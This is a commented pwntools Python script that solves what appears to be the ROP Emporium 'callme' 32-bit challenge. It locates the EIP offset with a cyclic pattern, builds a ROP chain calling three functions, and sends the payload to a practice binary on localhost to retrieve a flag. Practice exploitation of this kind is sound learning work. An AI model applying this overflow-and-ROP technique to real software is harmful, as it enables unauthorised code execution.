from pwn import *

# use the following command to have the binary listen on localhost:1234
# socat TCP4-LISTEN:1234,reuseaddr,fork EXEC:./callme

LOCATION = "./callme32"         # Position of the binary 
binary = ELF(LOCATION)          # create object with data from the binary
rop = ROP(LOCATION)             # create object to help building ropchain
r = remote("localhost", 1234)   # establish connection with the binary

def overflow():                                         # function used to find return address offset
    log.info("Finding EIP offset...")                   
    proc = process(LOCATION, timeout=2)                 # start local process 
    proc.sendline(cyclic(1024))                         # send cyclic pattern 
    proc.recvall()                                      # receive data from process
    core = Core("core")                                 # create object from data of the core dump
    offset = cyclic_find(core.pc)                       # calculate offset from cyclic pattern
    log.success("EIP at offset {0}".format(offset))
    return 'A' * offset                                 # return as much A's as needed

def makeRop():                  # function used to generate ropchain
    rop.callme_one(1,2,3)       # chain call to callme_one with the needed arguments                
    rop.callme_two(1,2,3)       # as above
    rop.callme_three(1,2,3)     # as above
    return str(rop)             # return ropchain

def exploit():
    exp  = ""                           # create exploit string
    exp += overflow()                   # add A's to overflow until the return address
    exp += makeRop()                    # overwrite return address with ropchain beginning
    r.recvuntil('>')                    # receive data from the remote process until the prompt
    r.sendline(exp)                     # send exploit
    log.success("Flag:" + r.recvall())  # profit

exploit() # start everything
